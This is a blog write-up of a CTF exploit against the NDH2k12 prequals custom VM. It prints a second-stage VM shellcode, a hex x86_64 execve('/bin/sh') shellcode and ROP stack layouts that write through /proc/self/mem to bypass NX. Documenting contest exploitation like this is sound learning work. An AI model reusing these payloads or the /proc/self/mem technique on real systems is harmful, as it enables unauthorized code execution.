---
title: 'More fun with the NDH2k12 Prequals VM'
date: 2012-03-28T00:00:00+02:00
tags: ["CTF", "writeup", "hacking"]
draft: false
---

*This article was co-authored with [Samuel Chevet](http://blog.w4kfu.com/).*

During the Nuit du Hack 2012 Prequals contest, we often had to remote exploit
some services running in a custom VM (which was [recently released on
GitHub](https://github.com/JonathanSalwan/VMNDH-2k12)). After injecting a
shellcode in the services (through a remote stack buffer overflow) we were able
to run VM code, which can execute interesting
syscalls: `read`, `write`, `open`, `exit`, and a lot more. However there was
not a way to directly execute a random x86 binary or to list directories
(no `getdents`), which made it really hard to explore the server filesystem.

After the event ended we got an idea that we could have used to bypass this
security and execute any shell command line on the remote server.
Using `/proc/self/cmdline`, we can get the path to the VM binary and download
it. Then, using `/proc/self/mem` we can replace some symbols from the binary by
our custom x86 code. This method works because without the [grsecurity
patchset](http://grsecurity.net/) `/proc/self/mem` completely overrides NX and
allows writing to read-only memory locations (like `.text`).

<!--more-->

We wrote an exploit
for [`exploit-me2.ndh`](https://blog.lse.epita.fr/articles/5-ndh2k12-prequals-exploit-me2-writeup-port-4004.html) which
does the following thing:

-   First, exploit the buffer overflow by sending a 102 chars string which will
    fill up the 100 bytes buffer and overwrite the stack pointer by the buffer
    start address. The buffer contains a shellcode which will load a second
    stage shellcode to memory. We had to do that because our main shellcode is
    bigger than 100 bytes. This VM code is loaded at offset `0x7800`,
    below `pie_base` to avoid crashing the VM.

-   Then, the second stage exploit opens `/proc/self/mem`, seeks to
    the `op_end` symbol location (VM instruction handler for `END (0x1C)`) and
    writes an `x86_64 execve("/bin/sh")` shellcode at this location. Seeking is
    not an easy task though as we can only manipulate 16 bits values inside the
    VM. Luckily the VM `.text` is at a very low address and we were able to use
    this at our advantage: for example, to seek to `0x4091bc`, we do a loop to
    seek forward `0xFFFF` 64 times then seek forward once more by `0x91fc`.
    After our shellcode replaced the end instruction, we execute
    the `0x1C` opcode to run our code.

Here is the second stage shellcode asm (first stage is really not that
interesting):

```
; Open /proc/self/mem
movb r0, #0x02
movl r1, #str
movb r2, #0x02
syscall
mov r1, r0

movb r0, #0x11  ; SYS_seek
movb r2, #0x0   ; offset
movb r3, #0x0   ; SEEK_SET
syscall

; Seek to 0x40 * 0xFFFF = 0x3fffc0
movl r2, #0xFFFF; offset
movb r3, #0x1   ; SEEK_CUR
movb r5, #0x40
loop:
    movb r0, #0x11  ; SYS_seek
    syscall

    dec r5
    test r5, r5
    jnz loop

; Seek forward to 0x4091bc == 0x40 * 0xFFFF + 0x91fc
movb r0, #0x11
movl r2, #0x91fc
syscall

; Write NULL to the address
movb r0, #0x04
movl r2, #shellcode
movb r3, #0x21
syscall

end ; PWNZORED

str: .asciz "/proc/self/mem"
shellcode:
    4831d248bbff2f62696e2f736848c1eb08534889e74831c050574889e6b03b0f05

```

This exploit works fine when the VM allows execution of writable pages (NX not
enabled). `exploit-me2.ndh` does not uses NX so this exploit works fine to
exploit this binary. However, we were interested to see if we could reproduce
this exploit on an NX enabled binary,
like [`web3.ndh`](https://blog.lse.epita.fr/articles/1-ndh2k12-prequals-web3ndh-writeup-port-4005.html).

The difficulty here is that you obviously can't simply write your VM shellcode
to memory and run it. You need to use ROP technics to run the code you want.
The `web3.ndh` binary contains a lot of interesting functions and gadgets to
ROP to so this was not as hard as expected.

This binary reads a 1020 bytes buffer, which is definitely enough for a simple
shellcode but not enough for our ROP shellcode which can't easily do loops.
This time again we built a two stage exploit: first stage does part of the job
and calls `read(2)` to load a second stage which does the rest of the work.

We built our first stage exploit stack like this:

```
7BF4    /proc/self/mem      # required string constant
    ... padding ...
7DF4    0xBEEF              # /GS canary

7DF6    0x8198              # offset to POP R1; POP R0; RET
7DF8    0x0002              # O_RDWR
7DFA    0x7BF4              # offset to /proc/self/mem
7DFC    0x81CA              # "open" function

7DFE    0x8174              # offset to POP R2; POP R1; RET
7E00    0x0000              # SEEK_SET
7E02    0x0000              # seek to 0
7E04    0x81EA              # "seek" function

[repeated 0x28 times]
        0x82C4              # offset to POP R2; RET
        0xFFFF              # seek 0xFFFF forward
        0x80FF              # offset to POP R3; RET
        0x0001              # SEEK_CUR
        0x81F9              # "lseek" function + 0xF to preserve regs
        0x4242              # dummy for a POP in lseek

7FE6    0x84ED              # "receive data" function
7FE8    0xFFFF              # padding
7FEA    0xFFFF              # padding

```

This does 0x28 / 0x40 of the required seeks, then recalls the vulnerable data
receive function to load the second stage stack which is placed just after on
stdin:

```
7BE0    0xFFFF              # padding
7BE2    0xFFFF              # padding

7BE4    [x86_64 execve(/bin/sh) shellcode + padding]
7DE4    0xBEEF              # /GS canary

7DE6    0x8176              # offset to POP R1; RET
7DE8    0x0003              # hardcoded /proc/self/mem fd (haxx)

[repeated 0x18 times]
        0x82C4              # offset to POP R2; RET
        0xFFFF              # seek 0xFFFF forward
        0x80FF              # offset to POP R3; RET
        0x0001              # SEEK_CUR
        0x81F9              # "lseek" function + 0xF to preserve regs
        0x4242              # dummy for a POP in lseek

7F0A    0x82C4              # POP R2; RET
7F0C    0x91FC              # last required offset
7F0E    0x80FF              # POP R3; RET
7F10    0x0001              # SEEK_CUR
7F12    0x81F9              # "lseek" + 0xF
7F14    0x4242              # dummy for a POP in lseek

7F16    0x82C4              # POP R2; RET
7F18    0x7BE4              # offset to shellcode
7F1A    0x80FF              # POP R3; RET
7F1C    0x0021              # shellcode length
7F1E    0x8193              # "write" syscall in the middle of a function
7F20    0x4242              # dummy for a POP
7F22    0x4242              # dummy for a POP

7F24    0x838c              # offset to END, which executes our x86 expl

    ... padding ...

7FE0    [shell command to execute]

```

Last step is to be able to bypass ASLR + NX. We weren't able to do this yet,
but we are confident that we could do it with some more work.

`/proc/self/mem` is really a powerful attack vector when you have to bypass
things like NX on a vanilla kernel!
